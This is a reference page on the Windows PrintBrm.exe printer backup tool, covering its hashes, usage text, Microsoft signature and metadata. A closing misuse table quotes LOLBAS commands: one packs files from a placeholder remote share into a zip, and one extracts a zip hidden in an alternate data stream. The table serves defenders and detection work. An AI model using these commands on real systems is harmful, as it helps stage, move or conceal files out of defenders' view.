---
title: PrintBrm.exe | Print BRM command line tool
excerpt: What is PrintBrm.exe?
---

# PrintBrm.exe 

* File Path: `C:\Windows\system32\spool\tools\PrintBrm.exe`
* Description: Print BRM command line tool

## Hashes

Type | Hash
-- | --
MD5 | `7AE2A5715DB7E235C7D6A4D4417E9335`
SHA1 | `0BFAE4746E05B65F66D6EBAB577235455E417D1D`
SHA256 | `3F6E33095973F37E7DFD51D511F116F37D92ECD0383BAFD7FC0E76F37F3D0531`
SHA384 | `E89423D875133235ED2575A8D5B5B41B8DFB032F33B5C949A6551F6230B8EDCBD3099A7305819DC98710B89C1728EA5A`
SHA512 | `B6BCE1202DA8A94E32A9EEECD068CE93F6ED5E9BB1F89764DECF58A8C8634730AE7AE2F46C30D36B24AF6D85A62E0067DF24A27D292385162C441E02C35E79BA`
SSDEEP | `384:eygfGoA3q3S/j6ae3m2vIOfgwi57MdLpdEjGt/miy6ZVqG27O5PPWWkhW:2GoA3qC/YX+SdFpzuG2+Ps`

## Runtime Data

### Usage (stdout):
```cmhg
Error: A single mode must be selected!

Access the Backup Recovery Migration tool through a command line interface.

PrintBrm -B|R|Q [-S <server>] -F <file> [-D <directory>] [-O FORCE] [-P ALL|ORIG] [-NOBIN] [-LPR2TCP] [-C <config file>] [-NOACL] [-?]
-B               Backup the server to the specified file
-R               Restore the configuration in the file to the server
-Q               Query the server or the backup file
-S <server name> Target server
-F <file name>   Target backup File
-D <directory>   Unpack the backup file to (with -R) or repack a backup file from (with -B) the given directory
-O FORCE         Force overwriting of existing objects
-P ALL|ORIG      Publish all printers in directory, or publish printers that were published originally
-NOBIN           Omit the binaries from the backup
-LPR2TCP         Convert LPR ports to Standard TCP/IP ports on restore
-C <file name>   Use the specified configuration file for BRM
-NOACL           Remove ACLs from print queues on restore
-?               Display this help

```

## Signature

* Status: Signature verified.
* Serial: `330000023241FB59996DCC4DFF000000000232`
* Thumbprint: `FF82BC38E1DA5E596DF374C53E3617F7EDA36B06`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: PrintBrm.exe.mui
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.19041.1 (WinBuild.160101.0800)
* Product Version: 10.0.19041.1
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## File Similarity (ssdeep match)

File | Score
-- | --
[C:\Windows\system32\spool\tools\PrintBrm.exe](PrintBrm.exe-BAE39750EE98F30056CC520ED59C8E88.md) | 90

## Possible Misuse

*The following table contains possible examples of `PrintBrm.exe` being misused. While `PrintBrm.exe` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `Name: PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Command: PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- Path: C:\Windows\System32\spool\tools\PrintBrm.exe`{:.highlight .language-yaml} | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [PrintBrm.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml) | `- IOC: PrintBrm.exe should not be run on a normal workstation`{:.highlight .language-yaml} | 



MIT License. Copyright (c) 2020-2021 Strontic.


